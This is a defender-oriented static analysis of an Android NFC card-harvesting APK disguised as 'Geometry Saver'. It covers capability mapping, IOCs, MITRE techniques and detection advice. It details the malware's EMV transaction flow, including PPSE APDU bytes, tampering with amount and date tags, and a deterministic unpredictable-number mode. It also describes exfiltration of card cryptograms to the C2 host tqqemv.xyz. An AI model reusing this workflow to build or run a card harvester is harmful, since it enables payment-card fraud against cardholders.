# `ckemv-harvester` — Android NFC/EMV Card-Harvesting Sample, Static Analysis

**Sample:** `samples/ckemv/sample.apk` · SHA-bound to file at `C:/Users/mogli/Desktop/Prj/Research/samples/ckemv/sample.apk` (6,755,535 bytes)
**Package:** `xyz.happify.ckemv`  ·  **Display label:** "Geometry Saver"
**Family context:** Android contactless-card harvester aligned with publicly tracked "NFC relay / ghost-tap" toolkits (ESET NGate, ThreatFabric Ghost Tap, Cleafy SuperCard X reporting). Companion to `Ghost_Tapping_Guarantee_Marketplaces_Research.md` in this repo.
**Analysis date:** 2026-05-16 · Static only (no execution / no live C2 probing).

This is a defender-oriented writeup: behavioral characterization, IOC extraction, MITRE ATT&CK mapping, and detection guidance. No offensive code or operational instructions are produced.

---

## 1. TL;DR

A phone running this APK is converted into a deceptive contactless reader. Any chip card tapped against the device is silently driven through one or more attacker-configured EMV transactions ("scenarios" the codebase calls `CveConfig`), producing fully-formed ARQC cryptograms with operator-chosen amount/date/currency parameters. The phone batches the captured tuples — PAN, AID, ATC, ARQC, IAD, transaction parameters, scheme tags — into JSON and posts them every ten seconds to **`https://tqqemv.xyz`**, the operator's C2. A 60-second background loop pulls new transaction "scenarios" and self-update APKs from the same host.

The Java/Kotlin layer is just plumbing (UI decoy, SQLite caching, NFC intent dispatch, periodic loops, FileProvider sideload). All EMV state-machine and transport logic lives in two stripped Rust JNI libraries (`libckemv_android.so`, `libckemv_reporter.so`) using `iso7816-tlv`, `num-bigint` (for EMV SDA/DDA cert verification), `ureq`+`rustls`+`ring`. There is no TLS pinning, no payload-layer crypto, and no on-device anti-analysis — the entire opsec budget is spent on the masquerade UI and on Rust `obfstr`-style compile-time XOR of header/method strings inside the natives.

The operator's build user is `arthur` on macOS. Internal version `1.7`.

---

## 2. Sample Layout

```
samples/ckemv/sample.apk             6.76 MB
└── (decompiled by jadx into samples/ckemv/apk_analysis/)
    ├── res_only/resources/
    │   ├── AndroidManifest.xml
    │   ├── classes.dex
    │   ├── assets/dexopt/baseline.{prof,profm}
    │   └── lib/arm64-v8a/
    │       ├── libckemv_android.so    1.08 MB  Rust EMV kernel
    │       └── libckemv_reporter.so   3.01 MB  Rust HTTPS/C2 client
    └── sources/sources/
        ├── xyz/happify/ckemv/         10 Java files (~1.3 KLOC sans R.java)
        └── B2/                        23 obfuscated Kotlin files (~2.3 KLOC)
```

ARM64 only — there is no `armeabi-v7a` or `x86_64` variant, so the sample is targeted at modern phones (Android 8.0+/API 26 minimum, per manifest).

---

## 3. AndroidManifest.xml — Capability Surface

| Item | Value | Risk |
| --- | --- | --- |
| `package` | `xyz.happify.ckemv` | typosquat / vanity TLD |
| `android:label` | "Geometry Saver" | masquerade — no relation to function |
| `versionName / versionCode` | `1.0 / 1` | placeholder; real version sits in `t.java` (1.7) |
| `minSdk / targetSdk` | 26 / 34 | full modern API access |
| `usesCleartextTraffic` | `true` | permits HTTP fallback if TLS fails |
| `allowBackup` | `true` | adb-pull recoverable harvest DB on debuggable builds |
| `uses-feature android.hardware.nfc required=true` | yes | will not install on non-NFC devices |

**Permissions requested:** `NFC`, `INTERNET`, `CAMERA`, `REQUEST_INSTALL_PACKAGES`, `WAKE_LOCK`, `FOREGROUND_SERVICE`, `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`, `ACCESS_NETWORK_STATE`, `RECEIVE_BOOT_COMPLETED`.

The `REQUEST_INSTALL_PACKAGES` permission is the smoking gun for a self-updater that sideloads APKs (see §6.4). `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` keeps the background upload loop alive on aggressive OEMs (Xiaomi, OnePlus). `RECEIVE_BOOT_COMPLETED` would normally pair with a `BootCompletedReceiver` for persistence — none is declared in the manifest, suggesting it is opportunistic (granted but unused, possibly because survival across reboot relies on the human operator re-opening the app).

**MainActivity intent filters:**
- `android.intent.action.MAIN` + `category.LAUNCHER` (normal launch)
- `android.nfc.action.TECH_DISCOVERED` with tech-list `xml/nfc_tech_filter` (matches `IsoDep`)
- `android.nfc.action.TAG_DISCOVERED`
- `android.nfc.action.NDEF_DISCOVERED` (`mimeType="*/*"`)

`launchMode="singleTask"` keeps a single foreground instance — necessary because the harvest pipeline assumes the activity is always the one foregrounded to the NFC subsystem.

**Other components of note:**
- `com.journeyapps.barcodescanner.CaptureActivity` (ZXing) — only path: operator scans a QR code that contains the collector `api_key`.
- `androidx.core.content.FileProvider` with authority `xyz.happify.ckemv.fileprovider` — used by `B2/h.java` to launch sideload of downloaded `update_v{x}.apk`.
- WorkManager and Room boilerplate (`SystemAlarmService`, `SystemJobService`, `SystemForegroundService`, etc.).

---

## 4. Native Library 1 — `libckemv_android.so` (EMV state machine)

**Format:** ELF64 aarch64, ~1.08 MB, NDK r25b / clang 14.0.6, built with **Rust 1.91** (commit `6b00bc3880198600130e1cf62b8f8a93494488cc`). Full RELRO (`BIND_NOW`). `.dynsym` is stripped but `.symtab` is intact — every Rust-mangled name is recoverable.

**JNI surface (registered at runtime via `JNI_OnLoad` + `RegisterNatives`):**

| Java method on `EmvKernel` | Native fn (offset) |
| --- | --- |
| `initialize(boolean, String)` | `ckemv_android::native_initialize` @ 0x43a64 |
| `getNextCommand()` | `native_get_next_command` @ 0x442dc |
| `processResponse(String)` | `native_process_response` @ 0x446fc |
| `getStatus()` | `native_get_status` @ 0x44da8 |
| `getPan()` | `native_get_pan` @ 0x450d0 |
| `getAtc()` | `native_get_atc` @ 0x45bd0 |
| `getArqc()` | `native_get_arqc` @ 0x466d0 |
| `getAid()` | `native_get_aid` @ 0x471d0 |
| `getTxParameters()` | `native_get_tx_parameters` @ 0x47cd0 |
| `getRawData()` | `native_get_raw_data` @ 0x48bc0 |

Only `JNI_OnLoad` appears in the dynamic symbol table — the ten handlers are wired up via 30 obfuscated `_OBFBYTES_SDATA` blobs at `.rodata 0x198b0–0x19a41`, an anti-static-analysis pattern.

**External imports (DT_NEEDED):** `liblog.so`, `libc.so`, `libm.so`, `libdl.so`. **No networking and no system crypto** — every EMV/RSA primitive is statically linked. Imports are pure libc plumbing + `__android_log_buf_write`/`__android_log_write`. Logcat tag: `CKEMV_NATIVE`.

**Linked Rust crates:** `jni-0.21.1`, `serde_json-1.0.149`, `iso7816-tlv-0.4.4`, `num-bigint-0.4.6` + `num-integer-0.1.46` (RSA bignum for EMV ODA), `hashbrown-0.15.3`, `bytes-1.11.1`, `hex-0.4.3`, `cesu8-1.1.0`, `android_logger-0.14.1`, `regex-automata-0.4.14`, plus an internal `rsa.*-cgu` translation unit.

**Behavior (recovered from `.rodata` log strings and crate names):**

The native side is a complete EMV book-2/book-3 *capture* kernel — it consumes APDU responses fed by the Java side from an `IsoDep` reader session and emits the next APDU to send. A `dispatcher::TransactionDispatcher` selects between `kernels::visa::VisaKernel` (qVSDC / VSDC, including the GPO-fast-path where the cryptogram is returned in the GPO response template) and `kernels::mchip::MastercardKernel` (M/Chip with potential 2nd GENERATE AC). Visible state-machine strings include `"Selecting PPSE/PSE"`, `"Selecting Application AID"`, `"Requesting Processing Options (GPO)"`, `"Reading Record (SFI/Record)"`, `"Requesting 1st Generate AC"`, `"Requesting 2nd Generate AC"`, `"Visa Fast-Path completed"`, `"Card approved offline! Returned TC"`, `"Card REJECTED offline! Returned AAC"`, `"PPSE failed, falling back to default AID A0000000031010"`.

The fallback AID `A0000000031010` is Visa Credit/Debit's standard AID — a sane default for a generic harvester. Mastercard apps are picked up dynamically from the PPSE entries by RID.

Offline data authentication (SDA/DDA/CDA) is implemented end-to-end (`ckemv_emv_kernel::crypto::oda::{recover_cert, build_static_data, verify_certificates, verify_issuer_public_key, verify_icc_public_key}`) — the kernel ships its own CA-key provider (`dyn CaKeyProvider`). It does **not** itself sign or generate ARQCs (which would require issuer master keys it cannot possess); it only captures the card-produced `9F26 ARQC` together with `9F36 ATC`, `9F10 IAD`, `9F37 UN`, `9F02 Amount`, etc.

A `generate_negative_correlated_time` helper combined with the log format `"Initialize: is_contactless=..., deterministic_un=..., params=..."` shows the kernel supports an explicit **deterministic Unpredictable Number** mode (replaying a chosen `9F37`) — a textbook pre-play / relay-research feature.

The full `params=` JSON consumed by `initialize` carries per-stage TLV overlays (`fci`, `gpo`, `sfi`, `cdol1`, `cdol2`, `ppse`) — the Kotlin layer flattens the `mastercard_tags`/`visa_tags` dict from `CveConfig` into this structure.

**Build leak:** `/Users/arthur/.cargo/registry/src/index.crates.io-...` confirms macOS build host, user `arthur`.

---

## 5. Native Library 2 — `libckemv_reporter.so` (C2 client)

**Format:** ELF64 aarch64, ~3.01 MB, NDK r25b / clang 14.0.6, **Rust 1.88.0**. Crate `ckemv-reporter`, single source file `ckemv-reporter/src/lib.rs`. Full RELRO. Same build user `arthur`.

**JNI surface:**

| Java method on `Reporter` | Native fn (offset) |
| --- | --- |
| `fetchCves(apiKey, url)` | `native_fetch_cves` @ 0xdf494 |
| `fetchReport(apiKey, url)` | `native_fetch_report` @ 0xdfbec |
| `uploadHarvestData(apiKey, url, json)` | `native_upload_harvest_data` @ 0xde7a4 |

Class FQCN, method names, and JNI signatures are stored XOR-obfuscated in `.rodata 0x2b0f6–0x2b253` via the `obfstr` crate pattern.

**External imports (DT_NEEDED):** `libc.so`, `libdl.so`. **That's it.** No `libssl`, no `libcrypto`, no `liblog`, no `libcurl`. The reporter ships its own TLS and HTTP entirely in-process.

**Linked Rust crates:**

| Crate | Version | Role |
| --- | --- | --- |
| `ureq` | 2.12.1 | Blocking HTTP/1.1 client |
| `rustls` | 0.23.37 | TLS 1.2/1.3 (with ECH greasing support) |
| `rustls-pki-types` | 1.14.0 | Trust anchors |
| `rustls-webpki` | 0.103.10 | Cert path validation |
| `ring` | 0.17.14 | AES-GCM / ChaCha20-Poly1305 / P-256/384 / X25519 / Ed25519 / SHA-2 |
| `url`, `flate2`, `miniz_oxide`, `base64`, `itoa`, `once_cell`, `cesu8`, `jni`, `serde_json` | — | misc transport / serialization |

**TLS posture:** **No pinning.** Verifier is the stock `rustls::webpki::server_verifier::WebPkiServerVerifier`. The CA store is a hand-embedded Mozilla bundle of roughly 140 mainstream public anchors (DigiCert, ISRG/Let's Encrypt, GTS, Sectigo, Amazon, GlobalSign, Microsoft, AC RAIZ FNMT-RCM, HARICA, etc.) — all DER, no PEM markers, no operator-specific anchor. The client therefore **happily trusts a corporate TLS-intercepting proxy whose CA was installed via Android Enterprise / MDM** — defenders can crack the traffic open at the proxy.

**No payload-layer envelope.** AES/ChaCha symbols belong exclusively to `ring`'s TLS providers; no `libsodium`, no `crypto_box`, no `Ed25519Signer` outside `rustls` cert paths, no embedded public keys, no shared secrets, no HMAC salts.

**HTTP transport tells:**
- `User-Agent: ureq/2.12.1` — strongly anomalous on an Android device (typical UA strings are `okhttp/*`, `Dalvik/*`, `com.google.android.gms/*`, `Chrome WebView`).
- `Content-Type: application/json` on POSTs.
- `Accept: */*`, gzip-decode capable (`flate2` + `miniz_oxide`).
- `Authorization` header (Bearer or Basic) — value sourced from the `api_key` JNI parameter; literal string is `obfstr`-hidden.
- `Proxy support` enabled via env (`HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY`); SOCKS disabled at build time.
- TLS 1.3 with ECH support and MLKEM768 hybrid kx — distinctive `rustls/ring` JA4 fingerprint suitable for SIEM pivot.

**Endpoint paths embedded:** `/me`, `/report`, `/harvest`. Hostnames are passed in from Java, not in the lib — see §6 for the full C2 picture.

---

## 6. Java / Kotlin Orchestration (`xyz.happify.ckemv` + `B2/`)

### 6.1 Database (`B2/a.java`, `xyz.happify.ckemv.DatabaseHelper`)

SQLite file `CkemvHarvest.db` version 8. Four tables:

```sql
CREATE TABLE cards (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    pan TEXT, aid TEXT, network TEXT, raw_data TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE transactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    card_id INTEGER, atc TEXT, arqc TEXT,
    time_ms REAL, params TEXT, cve_id INTEGER,
    FOREIGN KEY(card_id) REFERENCES cards(id)
);

CREATE TABLE stats (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    total_scans INTEGER DEFAULT 0,
    api_key TEXT
);

CREATE TABLE cves (
    id INTEGER PRIMARY KEY, name TEXT, amount INTEGER,
    mc_tags TEXT, visa_tags TEXT
);

INSERT INTO stats (total_scans, api_key) VALUES (0, NULL);
```

Three helper methods of interest:
- `i()` — returns `api_key` from `stats` row id 1.
- `o(CardRecord)` — atomically inserts a card + N transactions.
- `A(List<CveConfig>)` — `BEGIN TRANSACTION; DELETE FROM cves; INSERT...` — replaces the entire scenario cache on every C2 refresh (so the operator can rotate playbooks instantly).
- `a(long id)` — deletes a card and its transactions, called after a successful upload.

`onUpgrade` from any prior version drops everything (including a vestigial `terminals` table from a previous build), implying earlier iterations of this family existed.

### 6.2 NFC tag handler (`MainActivity.onNewIntent` → `B2/q.java`)

Triggered on `TAG_DISCOVERED` / `TECH_DISCOVERED` / `NDEF_DISCOVERED` intents while the activity is foregrounded (NfcAdapter foreground dispatch is registered in `onResume`). Behavior in `q.java`:

1. `IsoDep.connect()`, `setTimeout(10000)`.
2. Load `List<CveConfig>` from the local `cves` table.
3. SELECT PPSE: `isoDep.transceive(00 A4 04 00 0E 32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00)`. ASCII = `"2PAY.SYS.DDF01"` (the contactless Proximity Payment System Environment).
4. Scheme inference from the PPSE response hex: AID prefix `A000000003` → **Visa**, `A000000004` → **Mastercard**, otherwise **Unknown**.
5. Filter scenarios where the matching `*_tags` map is non-empty.
6. For each surviving `CveConfig`:
   - Run 3 outer iterations indexed by day offset (0/1/2 from `Calendar.getInstance()`, formatted `"yyMMdd"` with `Locale.CHINA` — note: hard-coded China locale).
   - Inner-loop count is 8 for day-offset 0 and 1, then 4 for day-offset 2 → up to **20 transactions per scenario per card-tap**.
   - The amount starts at `cveConfig.amount` and after each inner iteration is reduced by 5%, then randomly trimmed by 0–100 units. Loop terminates if amount < 100. EMV tag `9F02` is encoded as a 12-digit zero-padded ASCII string of this amount; tag `9A` is the future-dated transaction date.
   - These overrides are merged into the scenario's `mastercard_tags` / `visa_tags` map and serialized as JSON.
   - `EmvKernel.initialize(true /* contactless */, json)` then a tight loop: while `getStatus() == "InProgress"`, take `getNextCommand()` (hex APDU), `isoDep.transceive(...)`, feed the response hex back via `processResponse(...)`.
   - On completion the Java side reads `getAtc/getArqc/getPan/getAid/getRawData/getTxParameters` and, if `arqc` is non-empty, appends a `HarvestedTx(atc, arqc, elapsed_ms, params, cve_id)`.
7. Wrap accumulated transactions in a `CardRecord(pan, aid, network, rawData, txs)`, persist via `a.o(record)`.
8. Fire the upload coroutine `B2/o.java` (asynchronously, on `Dispatchers.IO`) which posts a freshly built JSON to `Reporter.uploadHarvestData(apiKey, "https://tqqemv.xyz", json)`.

There is a `UI progress bar` updated via `mainActivity.D.c(new Integer((i7 * 100) / size))` — feedback for the operator that the tap is still being processed.

### 6.3 Background upload loop (`B2/s.java`, launched on `Dispatchers.IO` from `onCreate`)

Endless loop with a 10-second `delay`:
1. Read `api_key` from `stats` (default `"no-key"`).
2. `SELECT * FROM cards ORDER BY id ASC`, hydrate `CardRecord`s with their `SELECT * FROM transactions WHERE card_id = ?`.
3. For each card, build the canonical upload JSON (see §6.6) and `Reporter.INSTANCE.uploadHarvestData(json, apiKey, "https://tqqemv.xyz")`.
4. If response contains the substring `"Success"`:
   - `a.a(id)` — delete card + transactions from local DB.
   - `UPDATE stats SET total_scans = total_scans + 1 WHERE id = 1`.
5. `delay(10000)`.

This guarantees harvested data is held on-device for at most ~10 seconds beyond when network is available. No retry back-off, no jitter, no exponential delay.

### 6.4 Background config / self-update loop (`B2/t.java`, also on `Dispatchers.IO`)

60-second loop:
1. Pull `api_key` (skip iteration if null).
2. `String fetchCves = Reporter.INSTANCE.fetchCves(apiKey, "https://tqqemv.xyz")`.
3. Parse with Gson (`b1.l`) into `MeResponse { name, cves[], latest_version }`.
4. **Self-update check** — `latest_version.major > 1 OR (major == 1 AND minor > 7)` triggers `MainActivity.w(api_key, "${major}.${minor}", ...)`. This compares against a hard-coded internal version `1.7`.
5. If a new version is available: `MainActivity.w()` POSTs `{"api_key":"..."}` as `application/json` (using OkHttp via the `okhttp3` library bundled in the APK) to the C2, expects an APK in the response body, streams it to `Environment.DIRECTORY_DOWNLOADS/update_v{version}.apk`, then schedules `B2/h.java` on `Dispatchers.Main` to fire an `ACTION_VIEW` intent with `application/vnd.android.package-archive` on the file via the `xyz.happify.ckemv.fileprovider` FileProvider — Android's standard sideload prompt.
6. Replace local `cves` table with the new list (`a.A(cves)`).
7. `delay(60000)`.

There is a redundant 15-minute `WorkManager` periodic job (`SyncWorker.java`) that performs only the `fetchCves` half — pure persistence/redundancy if the activity's coroutine dies.

### 6.5 UI decoy (`B2/w.java`)

The entire victim-visible UI is `w` — a `View` that draws 16 randomly-positioned circles of random color on a `#121212` background and connects nearby pairs with lines (the "vault dots and connections" aesthetic). A worker thread (`B2/u.java` case 0) updates positions every 16 ms with simple wall-bounce physics. There is a single header line that reads `"Active •"` in dim grey (`#444444`) and a green progress bar (`#00E676`) that flashes during NFC reads. The displayed label `"Geometry Saver"` references this — the rest of the manifest gives no hint of any geometry-related functionality.

Two long-press gestures on hidden hot zones are the operator's interface:
- Long-press on the (empty) status text → an `AlertDialog` with a paste field that writes directly into `stats.api_key`.
- Long-press on the right-side icon row → launches the ZXing `CaptureActivity` to scan a QR-encoded API key (prompt: *"Scan Collector API Key"*).

No other UI element responds to taps. There is no menu, no settings screen, no in-app help. This is consistent with operator-targeted tooling rather than malware that ever sees a victim user.

### 6.6 Upload payload shape (built in `q.java` and `s.java`)

```jsonc
{
  "pan":           "4123…",
  "aid":           "A0000000031010",
  "network":       "Visa",                 // or "Mastercard", "Unknown"
  "tx_count":      20,
  "raw_data":      { /* TLV map from EmvKernel.getRawData() */ },
  "harvested_txs": [
    {
      "atc":     "0042",
      "arqc":    "5A1F09…",
      "time_ms": 187.5,
      "cve_id":  3,
      "params":  { "9F02": "000000010000", "9A": "260516", "9F1A": "0840", "...": "..." }
    },
    /* … up to 20 of these per scenario … */
  ]
}
```

The `api_key` accompanies it as a separate native-call argument (forwarded to the `Authorization` header by `libckemv_reporter.so`, not body-embedded).

The `/me` GET/POST response shape, mirroring the `MeResponse` Kotlin class:

```jsonc
{
  "name": "<operator/collector name>",
  "cves": [
    { "id": 1, "name": "scenario1", "amount": 100000,
      "mastercard_tags": { "9F02": "...", "9F03": "...", ... },
      "visa_tags":       { "9F66": "...", "9F37": "...", ... } }
  ],
  "latest_version": { "major": 1, "minor": 8, "hash": "<commit>" }
}
```

---

## 7. C2 Infrastructure

- **Host:** `tqqemv.xyz`. Domain registered under the `.xyz` TLD; the label resembles a typosquat / brandable pattern common to fraud SaaS.
- **Scheme:** HTTPS only at the application code level; `usesCleartextTraffic="true"` in the manifest permits an HTTP fallback if attempted.
- **Endpoints:**
  - `POST /harvest` — uploads card+tx JSON; success indicated by literal `"Success"` substring in the response.
  - `GET/POST /me` — returns operator profile, scenario list, and latest-version info.
  - `GET/POST /report` — purpose not exercised in the Java side (no caller found); likely operator-side stats fetch.
  - `POST /` (or `/update`, exact path is OkHttp-built in `MainActivity.w()`) — returns binary APK body for the self-updater.
- **Auth:** `api_key` passed as JNI arg, materialized as an `Authorization` header by the reporter native. No CSRF, no nonce, no per-request signing.
- **No fallback host, no DGA, no Tor/onion address found** in either native or in the Java strings.

---

## 8. Operator / Build Provenance

- **Build user:** `arthur` (recoverable from `.cargo/registry` paths in both `.so` files).
- **Build OS:** macOS (implied by `/Users/` prefix on those paths).
- **Rust toolchains:** 1.91 nightly-ish (kernel), 1.88.0 stable (reporter) — kernel was rebuilt more recently than the reporter.
- **NDK:** r25b (clang 14.0.6) — common, slightly stale.
- **Crate naming:** `ckemv-android`, `ckemv-reporter`, `ckemv-emv-kernel` — a coherent workspace; the EMV kernel is shared with whatever PoS-side or relay-side tooling the operator runs.
- **Internal version threshold:** `1.7` (per `t.java`).
- **Single-file source for the reporter (`ckemv-reporter/src/lib.rs`)** suggests a small, maintained operator project rather than a large multi-developer codebase.

---

## 9. MITRE ATT&CK for Mobile Mapping

| Tactic | Technique | Evidence in sample |
| --- | --- | --- |
| Initial Access | (out of scope — relies on social engineering for sideload) | manifest requires `REQUEST_INSTALL_PACKAGES` |
| Persistence | T1624.001 *Broadcast Receivers* (potential) | `RECEIVE_BOOT_COMPLETED` requested but no receiver declared — possibly opportunistic |
| Persistence | T1541 *Foreground Persistence* | `WAKE_LOCK`, `FOREGROUND_SERVICE`, `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` |
| Defense Evasion | T1655.001 *Match Legitimate Name or Location* | label "Geometry Saver", package `xyz.happify.ckemv` |
| Defense Evasion | T1406 *Obfuscated Files or Information* | `obfstr` XOR'd strings in `.rodata`; `JNI_OnLoad`+`RegisterNatives` to hide native exports |
| Discovery | T1422 *System Network Configuration Discovery* | `ACCESS_NETWORK_STATE` |
| Collection | T1409 *Stored Application Data* | SQLite `CkemvHarvest.db` |
| Collection | T1517 *Access Notifications* | n/a |
| Collection | — *Card cryptogram capture* | not a standard mobile-ATT&CK technique; closest fit is T1119-flavored automated collection over the NFC interface |
| Command & Control | T1437.001 *Application Layer Protocol: Web Protocols* | HTTPS to `tqqemv.xyz` |
| Command & Control | T1521.002 *Encrypted Channel: Asymmetric Cryptography* | TLS via rustls/ring (no pinning, no app-level crypto) |
| Exfiltration | T1646 *Exfiltration Over C2 Channel* | `POST /harvest` |
| Impact | T1641.001 *Data Manipulation: Transmitted Data Manipulation* | per-scenario TLV overrides driven by C2 `cves` config |
| Updater | T1407 *Download New Code at Runtime* | `update_v{x}.apk` via FileProvider sideload |

---

## 10. Indicators of Compromise (IOC) Index

### Network IOCs

| Type | Value |
| --- | --- |
| Domain | `tqqemv.xyz` (and any sibling labels under `.xyz`) |
| URL paths | `/me`, `/harvest`, `/report` |
| User-Agent | `ureq/2.12.1` (anomalous on Android) |
| TLS client fingerprint | `rustls 0.23.37` + `ring 0.17.14` with ECH and MLKEM768 hybrid kx — distinctive JA4 |
| Upload Content-Type | `application/json` |
| Auth header | `Authorization: Bearer <api_key>` (likely) |

### Filesystem / package IOCs

| Type | Value |
| --- | --- |
| Package name | `xyz.happify.ckemv` |
| App label | `Geometry Saver` |
| File Provider authority | `xyz.happify.ckemv.fileprovider` |
| SQLite DB filename | `CkemvHarvest.db` (v8) |
| Update APK pattern | `${ExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)}/update_v{major.minor}.apk` |
| Native libs | `libckemv_android.so`, `libckemv_reporter.so` |
| Logcat tag | `CKEMV_NATIVE` |

### Static strings (high-fidelity YARA candidates)

```
ckemv-android/src/lib.rs
ckemv-reporter/src/lib.rs
ckemv-emv-kernel/src/
ckemv_emv_kernel::kernels::visa::VisaKernel
ckemv_emv_kernel::kernels::mchip::MastercardKernel
TransactionDispatcher
native_fetch_cves
native_upload_harvest_data
native_get_arqc
Visa Fast-Path completed
Card REJECTED offline! Returned AAC
PPSE failed, falling back to default AID A0000000031010
Initialize: is_contactless=
deterministic_un=
Selecting PPSE/PSE
/Users/arthur/.cargo/registry
```

### Distinctive JSON keys to alert on in egress

`pan`, `aid`, `network`, `tx_count`, `raw_data`, `harvested_txs`, `atc`, `arqc`, `time_ms`, `cve_id`, `params`, `mc_tags`, `visa_tags`, `mastercard_tags`, `latest_version`, paired with EMV tag hex `9F26`, `9F36`, `9F10`, `9F37`, `9F02`, `57`, `5A`.

---

## 11. Detection / Response Recommendations

1. **Sinkhole `tqqemv.xyz`** at corporate / ISP DNS. Any tap-to-pay-capable handset under management resolving the name is presumed compromised.
2. **Outbound TLS inspection** — because the binary embeds only public Mozilla anchors, an enterprise TLS-inspection CA installed via Android Enterprise / MDM is trusted automatically, and the JSON payloads decode in cleartext at the proxy. POST bodies containing the JSON keys listed in §10 are smoking guns.
3. **MDM hunt for the package** — block install of `xyz.happify.ckemv` and any package whose APK contains files named `libckemv_android.so` or `libckemv_reporter.so`. The filenames are unique enough to be a straight string search across an installed-app inventory.
4. **YARA / mobile-AV signature** on the static-string set in §10 (especially `/Users/arthur/.cargo/registry` paired with `native_upload_harvest_data` and the `CKEMV_NATIVE` log tag).
5. **TLS-fingerprint alerting** on the `ureq/2.12.1` UA observed on a mobile network connection, especially combined with a `.xyz` SNI on a freshly-registered domain.
6. **Logcat collection in vendor bug reports / MDM diagnostics** — `CKEMV_NATIVE`-tagged messages of the form `Initialize: is_contactless=…, params=…`, `Selecting PPSE/PSE`, `Requesting 1st Generate AC`, etc., are conclusive on-device telemetry.
7. **Card-issuer side** — any cardholder authorization request with abnormal `9F37` (Unpredictable Number) entropy (constant or repeating), or with operator-correlated `9A` Transaction Date deltas from now (today / today+1 / today+2), warrants ARQC-validation hardening and potential issuer-host velocity flags. This is the network-side signal that the harvester's output is being monetized.
8. **Cardholder education** — only tap-to-pay on devices and terminals you control; physically separating contactless cards (RFID-shielded sleeves, separate wallet for daily use) defeats the close-proximity tap-attack premise.

---

## 12. Open Questions / Future Work

- **Monetization back-end** — what does the operator do with the captured ARQC + transaction-input tuples? Two plausible paths: (a) real-time relay to a paired device representing itself as a contactless terminal to the issuer host ("ghost tap"); (b) replay into MOTO / e-commerce channels that accept downgraded cryptograms. The static analysis cannot distinguish; live C2 emulation in a lab would resolve it.
- **`/report` endpoint** — exists in the native lib but has no Java caller. May be a reserved operator-side API for retrieving harvested records out of `tqqemv.xyz` (i.e., a parallel pull-side API for the C2 dashboard).
- **Operator dashboard** — no panel URL strings are embedded. The `name` field returned in `/me` and the `Geometry Saver` cover hint at a multi-tenant SaaS where each operator (mule) has their own `api_key`.
- **Earlier versions** — the manifest references a `terminals` table dropped on upgrade-from-prior-v8. Older samples in the family may have tracked PoS / acquirer terminal metadata separately.
- **Cross-platform variants** — `arm64-v8a`-only here; relay-side counterparts presumably exist for iOS jailbroken devices or PC-tethered HCE emulators. Hunt for the same Rust crate names (`ckemv-emv-kernel`) in other binaries to find them.
- **Companion to `Ghost_Tapping_Guarantee_Marketplaces_Research.md`** — that document tracks the marketplaces where stolen-card / tap-relay services are advertised; correlating `tqqemv.xyz` against handles, panel screenshots, or operator branding observed in those marketplaces would identify the operator group.

---

## 13. Reproducibility

All extracted artifacts and intermediate dumps from this analysis live under `C:\Users\mogli\Desktop\Prj\Research\apk_analysis\`:

- `res_only/resources/AndroidManifest.xml`
- `res_only/resources/lib/arm64-v8a/libckemv_android.so`
- `res_only/resources/lib/arm64-v8a/libckemv_reporter.so`
- `sources/sources/xyz/happify/ckemv/*.java`
- `sources/sources/B2/*.java`

The two native libraries were profiled with `llvm-strings`, `llvm-nm --defined-only --print-size`, and `llvm-readelf -h/-S/-d` from the Android NDK r25b LLVM toolchain. Sources were decompiled with **jadx**.
